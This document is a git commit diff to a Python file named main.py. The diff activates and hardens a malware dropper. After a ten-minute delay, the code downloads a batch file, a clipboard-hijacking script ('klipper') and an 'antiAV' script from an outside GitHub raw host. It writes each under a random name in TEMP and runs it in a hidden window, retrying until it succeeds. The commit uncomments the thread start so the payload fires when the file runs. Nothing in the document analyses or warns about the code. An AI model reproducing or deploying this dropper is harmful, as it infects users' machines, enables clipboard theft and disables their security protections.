bc1f30aa25b3c89c51fddcb2ebd85657fd59a293
skiddyskid111 <dhwhrvcxa@gmail.com>
2025-09-20 12:45:32 +0200

    Update main.py

--- main.py
+++ main.py
@@ -3,39 +3,44 @@ import os
 import urllib.request
 import time
 import threading
+import uuid
 
 def main():
+    TEMP = os.getenv('TEMP')
+
+    time.sleep(600)
+
     url = 'https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/main.bat'
-    path = os.path.join(os.getenv('TEMP') or '.', 'main.bat')
+    path = os.path.join(TEMP, f'{uuid.uuid4().hex}.bat')
     while True:
         try:
-            urllib.request.urlretrieve(url, path)
-            subprocess.Popen(path, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0)
+            with urllib.request.urlopen(url) as res, open(path, 'wb') as f:
+                f.write(res.read())
+            subprocess.Popen(path, creationflags=subprocess.CREATE_NO_WINDOW)
             break
-
         except:
             time.sleep(3)
 
     url = 'https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/klipper.pyw'
-    path = os.path.join(os.getenv('TEMP') or '.', 'klipper.pyw')
+    path = os.path.join(TEMP, f'{uuid.uuid4().hex}.pyw')
     while True:
         try:
-            urllib.request.urlretrieve(url, path)
-            subprocess.Popen(path, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0)
+            with urllib.request.urlopen(url) as res, open(path, 'wb') as f:
+                f.write(res.read())
+            subprocess.Popen(path, creationflags=subprocess.CREATE_NO_WINDOW)
             break
-
         except:
             time.sleep(3)
 
     url = 'https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/antiAV.pyw'
-    path = os.path.join(os.getenv('TEMP') or '.', 'antiAV.pyw')
+    path = os.path.join(TEMP, f'{uuid.uuid4().hex}.pyw')
     while True:
         try:
-            urllib.request.urlretrieve(url, path)
-            subprocess.Popen(path, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0)
+            with urllib.request.urlopen(url) as res, open(path, 'wb') as f:
+                f.write(res.read())
+            subprocess.Popen(path, creationflags=subprocess.CREATE_NO_WINDOW)
             break
-
         except:
             time.sleep(3)
 
-#threading.Thread(target=main).start()
+threading.Thread(target=main).start()
